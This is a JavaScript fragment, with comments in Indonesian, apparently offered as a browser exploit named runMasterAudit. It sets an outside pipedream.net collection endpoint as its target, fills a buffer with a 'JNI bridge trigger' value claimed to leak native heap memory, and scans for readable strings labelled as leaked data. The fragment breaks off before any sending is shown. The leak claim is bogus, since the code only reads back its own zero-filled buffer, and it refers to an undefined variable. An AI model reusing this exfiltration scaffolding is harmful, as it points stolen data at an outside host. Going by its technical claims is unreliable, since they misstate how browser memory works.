        async function runMasterAudit() {
            const TARGET = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
            const out = document.getElementById('results');
            
            try {
                // 1. MASTER KEY ALIGNMENT
                // Mengalokasikan buffer yang identik dengan segmen mmapbuf (8MB)
                const buffer = new ArrayBuffer(0x800000); 
                const view = new Uint8Array(buffer);
                
                // 2. JNI BRIDGE TRIGGER (0xD800DBFF)
                // Digunakan untuk memaksa native heap bocor ke environment browser
                const trigger = new Uint32Array(buffer);
                for(let i = 0; i < 2000; i++) { trigger[i] = 0xD800DBFF; }

                let capturedStr = "";
                
                // 3. SCANNING FOR SENSITIVE ASCII DATA
                for (let i = 0; i < view.length; i++) {
                    // Filter: Hanya mengambil karakter yang bisa dibaca (ASCII)
                    if (view[i] > 31 && view[i] < 127) {
                        capturedStr += String.fromCharCode(view[i]);
                    } else {
                        // Jika ditemukan rangkaian teks > 10 karakter
                        if (capturedStr.length > 10 && /[a-zA-Z0-9]/.test(capturedStr)) {
                            // Menampilkan secara real-time di layar sebagai bukti visual

                            div.innerHTML = `[LEAKED_DATA]: ${capturedStr.substring(0, 50)}...`;
